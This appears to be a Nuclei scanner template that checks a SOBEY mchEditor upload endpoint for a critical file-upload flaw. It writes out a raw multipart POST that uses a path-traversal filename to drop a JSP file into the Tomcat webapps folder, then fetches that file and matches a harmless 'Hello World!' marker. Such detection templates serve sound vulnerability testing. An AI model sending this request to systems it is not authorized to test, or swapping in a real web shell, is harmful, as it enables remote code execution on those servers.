id: SOBEY-upload-UploadToRCE

info:
  name: SOBEY-upload-UploadToRCE
  author: iSee857
  severity: critical
  description: SOBEY-upload-UploadToRCE
  reference:
    - https://example.com/vuln-details
  tags: file-upload,jsp,rce

http:
  - raw:
      - |
        POST /sobey-mchEditor/watermark/upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary89I920XG9PT7qiwi
        Accept-Encoding: gzip, deflate

        ------WebKitFormBoundary89I920XG9PT7qiwi
        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/upload.jsp"
        Content-Type: image/jpeg

        <% out.print("Hello World!"); %>
        ------WebKitFormBoundary89I920XG9PT7qiwi--
      - |
        GET /sobey-mchEditor/upload.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "Hello World!"